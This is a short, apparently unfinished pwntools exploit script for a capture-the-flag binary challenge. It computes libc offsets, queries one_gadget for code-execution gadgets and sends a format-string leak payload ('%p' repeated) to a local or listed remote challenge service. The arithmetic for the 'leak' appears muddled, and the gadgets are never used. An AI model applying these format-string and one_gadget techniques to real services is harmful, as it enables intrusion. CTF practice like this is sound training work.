from pwn import *
import subprocess
context.terminal=['tmux', 'splitw', '-h']
def one_gadget():
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).decode().split(' ')]


p = process("./prob10")
#p = remote("fsi.zzado.kr", 9940)
e = ELF("./prob10")
lib = ELF('./libc.so.6')
printf_got = e.symbols['printf']
printf_lib = lib.symbols['printf']
log.info(f'printf(prob) : {hex(printf_got)}')
log.info(f'printf(libc) : {hex(printf_lib)}')
log.info(f'offset : {hex(abs(printf_got - printf_lib))}')
puts_got = e.got['puts']
puts_plt = e.plt['puts']
leak_data = abs(printf_got - printf_lib)
leak_base = leak_data 

ogt_offset = one_gadget()
print(ogt_offset)


p.recvuntil('[1]')
payload = b'%p '*15
p.send(payload)
p.recv()

context.bits = 64

p.interactive()
